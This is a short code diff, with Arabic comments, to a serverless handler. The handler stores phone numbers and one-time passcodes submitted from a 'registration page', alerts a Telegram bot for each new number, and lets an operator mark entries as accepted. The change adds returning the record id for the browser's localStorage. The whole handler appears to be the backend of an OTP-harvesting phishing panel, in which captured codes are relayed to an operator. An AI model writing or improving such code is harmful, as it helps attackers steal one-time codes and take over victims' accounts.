@@ -18,10 +18,11 @@ export default async function handler(req, res) {
             return res.status(200).json(data);
         }
 
-        // 2. إرسال بيانات جديدة (من صفحة المستخدم)
+        // 2. إرسال بيانات جديدة (من صفحة التسجيل)
         if (method === 'POST') {
             const { phone, otp } = req.body;
-            await addDoc(usersCol, { phone, otp, status: "pending", timestamp: new Date() });
+            // حفظ البيانات والحصول على المرجع
+            const docRef = await addDoc(usersCol, { phone, otp, status: "pending", timestamp: new Date() });
             
             // إشعار تليجرام
             await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -29,7 +30,9 @@ export default async function handler(req, res) {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text: `رقم جديد: ${phone}` })
             });
-            return res.status(200).json({ success: true });
+            
+            // نرسل الـ id للمتصفح ليخزنه في localStorage
+            return res.status(200).json({ success: true, id: docRef.id });
         }
 
         // 3. تعديل الحالة (قبول)
